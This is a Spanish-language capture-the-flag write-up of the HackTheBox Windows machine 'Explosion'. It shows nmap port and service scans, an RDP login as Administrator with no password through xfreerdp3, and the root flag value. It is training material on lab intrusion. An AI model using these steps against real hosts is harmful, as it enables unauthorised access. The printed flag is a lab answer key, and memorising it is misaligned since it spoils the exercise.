# Explosion

Plataforma: HackTheBox
OS: Windows
Level: Very Easy
Status: Done
Complete: Yes
Created time: 4 de enero de 2025 21:01
IP: 10.129.1.13

## Recopilación de información

<aside>
💡

</aside>

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.1.13 -oG allports

PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 127
139/tcp   open  netbios-ssn   syn-ack ttl 127
445/tcp   open  microsoft-ds  syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
5985/tcp  open  wsman         syn-ack ttl 127
47001/tcp open  winrm         syn-ack ttl 127
49664/tcp open  unknown       syn-ack ttl 127
49665/tcp open  unknown       syn-ack ttl 127
49666/tcp open  unknown       syn-ack ttl 127
49667/tcp open  unknown       syn-ack ttl 127
49668/tcp open  unknown       syn-ack ttl 127
49669/tcp open  unknown       syn-ack ttl 127
49670/tcp open  unknown       syn-ack ttl 127
49671/tcp open  unknown       syn-ack ttl 127

```

![image.png](<imagenes/image 69.png>)

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
❯ sudo nmap -p135,139,445,3389,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 -sCV 10.129.1.13 -oN targeted

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: EXPLOSION
|   NetBIOS_Domain_Name: EXPLOSION
|   NetBIOS_Computer_Name: EXPLOSION
|   DNS_Domain_Name: Explosion
|   DNS_Computer_Name: Explosion
|   Product_Version: 10.0.17763
|_  System_Time: 2025-01-04T20:04:51+00:00
| ssl-cert: Subject: commonName=Explosion
| Not valid before: 2025-01-03T19:56:16
|_Not valid after:  2025-07-05T19:56:16
|_ssl-date: 2025-01-04T20:04:59+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-04T20:04:55
|_  start_date: N/A
```

- **Identificación de vulnerabilidades**
    - 135/tcp   open  msrpc         syn-ack ttl 127
    - 139/tcp   open  netbios-ssn   syn-ack ttl 127
    - 445/tcp   open  microsoft-ds  syn-ack ttl 127
    - 3389/tcp  open  ms-wbt-server syn-ack ttl 127
    - 5985/tcp  open  wsman         syn-ack ttl 127
    - 47001/tcp open  winrm         syn-ack ttl 127
    - 

## Explotación

<aside>
💡 Probamos a conectarnos por rdp con usuario administrador

</aside>

### Explotación 1

```bash
xfreerdp3 /u:Administrator /v:10.129.1.13
```

Obtenemos login con usuario administrador y la flag de root.

Flag: **951fa96d7830c451b536be5a6be008a0**

## Conclusión

<aside>
💡 Maquina fácil sin escalada ni complicaciones

</aside>